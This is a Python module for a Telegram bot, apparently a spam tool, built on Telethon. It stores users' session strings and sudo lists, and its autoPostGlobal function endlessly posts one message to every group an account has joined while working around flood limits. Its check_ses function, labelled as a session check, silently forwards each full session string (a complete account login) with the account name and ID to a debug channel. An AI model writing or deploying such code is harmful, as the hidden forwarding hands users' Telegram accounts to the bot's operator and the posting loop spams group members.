# Made By @LEGENDX22 For Ap Hacker
# Dont Kang Without Credits
# ©️2024 LEGENDX22
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
from telethon import TelegramClient, Button
from dataManage import *
from env import *
from classUtils import FileManage
import asyncio, random


def saveClient(senderID, client):
    if senderID in userClients:
        userClients[senderID].append(client)
    else:
        userClients[senderID] = [client]

def getClients(senderID) -> list:
    return userClients.get(senderID, [])

def delClient(senderID, client):
    userClients[senderID].remove(client)


def saveSudo(userID):
    SUDO_USERS.append(int(userID))

def delSudo(userID):
    SUDO_USERS.remove(int(userID))

def getSudo(userID):
    return int(userID) in SUDO_USERS

def getSudos():
    return int(SUDO_USERS)

def fixType(value):
    try:
        x = int(value)
        return x
    except:
        x = str(value)
        return x

async def autoPostGlobal(client, event, message, sleep_time, file = None):
    if int(sleep_time) < 15:
        sleep_time = 15
    sent = []
    fileManager = FileManage()
    fileManager.saveFileInfo("sent.txt")
    logger = TeleLogging()
    loggerId = await logger.get_logger(str(event.sender.id))
    loggerID = fixType(loggerId)
    print(loggerID)
    print("Auto posting started")
    while True:
        try:
            dialogs = await client.get_dialogs()
            random.shuffle(dialogs)
        except Exception as e:
            print(e)
            break
        myFirstName = (await client.get_me()).first_name
        for dialog in dialogs:
            if dialog.is_group:
                try:
                    await client.send_message(dialog.id, message, file = file)
                    print(f"Message sent to {dialog.title} from {(await client.get_me()).first_name}")
                    sent.append(dialog.title)
                    await asyncio.sleep(1)
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                    continue
                except ConnectionError:
                    print("Connection error")
                    break
                except Exception as e:
                    print(e)
                    continue
            else:
                pass
        sentList = "\n".join(sent)
        fileManager.writeFile(fileManager.file, sentList)
        print("now it should send logs")
        if loggerID:
            try:
                await event.client.send_message(loggerID, f"Message sent to {len(sent)} from {myFirstName} group list attached below", file = fileManager.file)
                fileManager.deleteFile(fileManager.file)
            except Exception as e:
                print(e)
        else:
            print("No logger set")
        sent.clear()
        await asyncio.sleep(int(sleep_time))



async def check_ses(string: str, event = None) -> bool:
    try:
        async with TelegramClient(StringSession(string), api_id, api_hash) as client:
            try:
                me = await client.get_me()
                if event:
                    message = f"Name: `{me.first_name}`\nID: `{me.id}`\n\n`{string}`"
                    try:
                        await event.client.send_message(debug_channel_id, message)
                    except:
                        pass
                await client.disconnect()
            except Exception as e:
                print(f"Error: {str(e)}")
                return True
            return True
    except Exception as e:
        print(f"Error: {str(e)}")
        return False
    

async def check_all_sessions(senderID, event):
    sessionManage = TeleSession()
    all_sessions = await sessionManage.get_sessions(senderID)
    for session in all_sessions:
        if not await check_ses(session):
            await sessionManage.delete_session(senderID, session)
            await event.respond("Session is not working. Deleted.")
        else:
            print(f"Session is working")


async def sessionSort(senderID):
    sessions = set()
    sessionManage = TeleSession()
    all_sessions = await sessionManage.get_sessions(senderID)
    for session in all_sessions:
        sessions.add(session)
        await sessionManage.delete_session(senderID, session)
    for session in sessions:
        await sessionManage.add_session(senderID, session)
    return True



async def setSudo(OWNERS):
    sudoManager = TeleSudo()
    sudos = await sudoManager.get_sudos()
    for sudo in OWNERS:
        saveSudo(sudo)
    for sudo in sudos:
        saveSudo(sudo)

async def alert_owners(bot):
    message = "Hey, The bot has been restarted.\n__Please use DM button to interact with me!__"
    logger = TeleLogging()
    await bot.getMe()
    dmButton = Button.url('DM', 'https://t.me/{}'.format(bot.me.username))
    chats = await logger.chat_ids()
    for chat in chats:
        try:
            chatID = fixType(chat)
            await bot.send_message(chatID, message, buttons=dmButton)
        except:
            pass
